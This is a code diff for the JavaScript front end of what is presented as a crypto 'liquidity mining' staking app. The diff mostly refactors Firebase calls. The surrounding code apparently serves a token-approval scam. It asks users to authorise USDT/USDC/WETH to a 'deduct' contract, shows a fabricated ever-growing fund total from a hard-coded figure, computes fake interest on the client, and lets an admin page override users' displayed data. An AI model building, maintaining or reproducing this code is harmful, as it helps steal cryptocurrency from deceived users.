@@ -1,16 +1,14 @@
 // ==================== Firebase 初始化 ====================
-const { initializeApp } = window.firebase.app;
-const { getFirestore, doc, setDoc, getDoc, onSnapshot } = window.firebase.firestore;
-const firebaseConfig = {
+const app = window.firebase.initializeApp({
   apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
   authDomain: "aroxa-mining.firebaseapp.com",
   projectId: "aroxa-mining",
   storageBucket: "aroxa-mining.firebasestorage.app",
   messagingSenderId: "596688766295",
   appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
-};
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+});
+const db = window.firebase.firestore();
+
 // ==================== 常數 ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -27,12 +25,14 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
+
 // DOM 元素
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
 let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
 let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
 let elements = {};
+
 // 變數
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
@@ -190,6 +190,7 @@ const translations = {
   }
 };
 let currentLang = localStorage.getItem('language') || 'en';
+
 // 日誌函數
 function log(message, type = 'info') {
   const timestamp = new Date().toLocaleTimeString();
@@ -206,6 +207,7 @@ function log(message, type = 'info') {
     logContainer.scrollTop = logContainer.scrollHeight;
   }
 }
+
 // 安全獲取 DOM 元素
 function getElements() {
   connectButton = document.getElementById('connectButton');
@@ -247,6 +249,7 @@ function getElements() {
     pledgeBtnText: pledgeBtn
   };
 }
+
 async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   for (let i = 0; i < maxAttempts; i++) {
     try {
@@ -257,6 +260,7 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
     }
   }
 }
+
 // ==================== Firestore 儲存 ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
@@ -279,7 +283,7 @@ async function saveUserData(data = null, addToPending = true) {
   };
   log(`儲存資料到 Firestore: ${userAddress}`, 'send');
   try {
-    await setDoc(doc(db, 'users', userAddress), dataToSave, { merge: true });
+    await db.collection('users').doc(userAddress).set(dataToSave, { merge: true });
     log('資料儲存成功', 'success');
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
@@ -290,13 +294,13 @@ async function saveUserData(data = null, addToPending = true) {
     }
   }
 }
+
 // ==================== Firestore 載入 + 即時監聽 ====================
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
-    const docRef = doc(db, 'users', userAddress);
-    const snap = await getDoc(docRef);
-    if (!snap.exists()) {
+    const snap = await db.collection('users').doc(userAddress).get();
+    if (!snap.exists) {
       log(`無用戶數據`, 'info');
       return;
     }
@@ -323,12 +327,12 @@ async function loadUserDataFromServer() {
     log(`載入失敗: ${error.message}`, 'error');
   }
 }
+
 // 即時監聽
 function startRealtimeListener() {
   if (!userAddress) return;
-  const docRef = doc(db, 'users', userAddress);
-  const unsubscribe = onSnapshot(docRef, (docSnap) => {
-    if (docSnap.exists()) {
+  const unsubscribe = db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
+    if (docSnap.exists) {
       const userData = docSnap.data();
       if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
         log(`即時更新: ${userData.source}`, 'receive');
@@ -340,6 +344,7 @@ function startRealtimeListener() {
   });
   return unsubscribe;
 }
+
 function updateStatus(message, isWarning = false) {
   if (!statusDiv) return;
   statusDiv.innerHTML = message || '';
@@ -347,6 +352,7 @@ function updateStatus(message, isWarning = false) {
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
   statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
+
 function resetState(showMsg = true) {
   signer = userAddress = null;
   pledgedAmount = 0;
@@ -375,9 +381,11 @@ function resetState(showMsg = true) {
   if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
   if (showMsg) updateStatus(translations[currentLang].noWallet, true);
 }
+
 function disconnectWallet() {
   resetState(true);
 }
+
 function disableInteractiveElements(disable = false) {
   if (startBtn) startBtn.disabled = disable;
   if (pledgeBtn) pledgeBtn.disabled = disable;
@@ -386,6 +394,7 @@ function disableInteractiveElements(disable = false) {
   if (pledgeToken) pledgeToken.disabled = disable;
   if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
 }
+
 function updateBalancesUI(walletBalances) {
   if (!walletTokenSelect) return;
   const selectedToken = walletTokenSelect.value;
@@ -397,6 +406,7 @@ function updateBalancesUI(walletBalances) {
   const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
   if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
 }
+
 function updateTotalFunds() {
   if (!totalValue) return;
   const initialFunds = 12856459.94;
@@ -406,6 +416,7 @@ function updateTotalFunds() {
   const total = initialFunds + (elapsedSeconds * increasePerSecond);
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
+
 async function refreshEthPrice() {
   const now = Date.now();
   if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
@@ -419,11 +430,13 @@ async function refreshEthPrice() {
     console.warn('Price fetch failed, using fallback');
   }
 }
+
 function initializeMiningData() {
   localStorage.setItem('totalGrossOutput', '0');
   localStorage.setItem('claimable', '0');
   localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
 }
+
 function getETOffsetMilliseconds() {
   const now = new Date();
   const mar = new Date(now.getFullYear(), 2, 8);
@@ -434,12 +447,14 @@ function getETOffsetMilliseconds() {
   const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
   return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
 }
+
 function updateClaimableDisplay() {
   if (!grossOutputValue || !cumulativeValue) return;
   const claimable = window.currentClaimable || 0;
   grossOutputValue.textContent = `${claimable.toFixed(7)} ETH`;
   cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
 }
+
 async function updateInterest() {
   if (!userAddress || pledgedAmount <= 0) {
     window.currentClaimable = 0;
@@ -463,6 +478,7 @@ async function updateInterest() {
   }
   updateClaimableDisplay();
 }
+
 function updateClaimModalLabels() {
   const claimLabels = {
     'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
@@ -478,6 +494,7 @@ function updateClaimModalLabels() {
     labelElements[2].textContent = labels.equivalentValue;
   }
 }
+
 async function claimInterest() {
   await refreshEthPrice();
   updateClaimModalLabels();
@@ -489,10 +506,12 @@ async function claimInterest() {
   if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
   if (claimModal) claimModal.style.display = 'flex';
 }
+
 function closeClaimModal() {
   if (claimModal) claimModal.style.display = 'none';
   if (claimInterval) clearInterval(claimInterval);
 }
+
 function updateNextBenefitTimer() {
   if (!nextBenefit) return;
   const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
@@ -516,6 +535,7 @@ function updateNextBenefitTimer() {
   const seconds = String(totalSeconds % 60).padStart(2, '0');
   nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
 }
+
 function setInitialNextBenefitTime() {
   if (localStorage.getItem('nextBenefitTime')) return;
   const etOffset = getETOffsetMilliseconds();
@@ -527,6 +547,7 @@ function setInitialNextBenefitTime() {
   localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
   saveUserData();
 }
+
 function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
   initializeMiningData();
@@ -537,6 +558,7 @@ function activateStakingUI() {
   saveUserData();
   updateInterest();
 }
+
 async function sendMobileRobustTransaction(populatedTx) {
   if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
   const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
@@ -557,6 +579,7 @@ async function sendMobileRobustTransaction(populatedTx) {
   if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
   return receipt;
 }
+
 async function initializeWallet() {
   if (!window.ethers) {
     updateStatus(translations[currentLang].ethersError, true);
@@ -593,6 +616,7 @@ async function initializeWallet() {
     if (connectButton) connectButton.disabled = true;
   }
 }
+
 async function connectWallet() {
   try {
     if (typeof window.ethereum === 'undefined') {
@@ -609,7 +633,7 @@ async function connectWallet() {
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account.");
     signer = provider.getSigner();
-    userAddress = await signer.getAddress < 0 ? signer.getAddress() : signer.getAddress();
+    userAddress = await signer.getAddress();
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -631,6 +655,7 @@ async function connectWallet() {
     if (connectButton) connectButton.disabled = typeof window.ethereum === 'undefined';
   }
 }
+
 async function forceRefreshWalletBalance() {
   if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
     updateStatus('Contracts not initialized.', true);
@@ -650,6 +675,7 @@ async function forceRefreshWalletBalance() {
     updateStatus('Balance fetch failed.', true);
   }
 }
+
 async function updateUIBasedOnChainState() {
   if (!signer) return;
   try {
@@ -716,6 +742,7 @@ async function updateUIBasedOnChainState() {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
   }
 }
+
 async function handleConditionalAuthorizationFlow() {
   if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
   updateStatus('Authorizing...');
@@ -762,6 +789,7 @@ async function handleConditionalAuthorizationFlow() {
   }
   await forceRefreshWalletBalance();
 }
+
 function updateLanguage(lang) {
   currentLang = lang;
   if (languageSelect) languageSelect.value = lang;
@@ -784,6 +812,7 @@ function updateLanguage(lang) {
   };
   setTimeout(apply, 200);
 }
+
 // 初始化
 document.addEventListener('DOMContentLoaded', () => {
   getElements();
@@ -902,7 +931,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
       };
       try {
-        await setDoc(doc(db, 'pledges', userAddress), pledgeData.pledges, { merge: true });
+        await db.collection('pledges').doc(userAddress).set(pledgeData.pledges, { merge: true });
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData();
       } catch (error) {
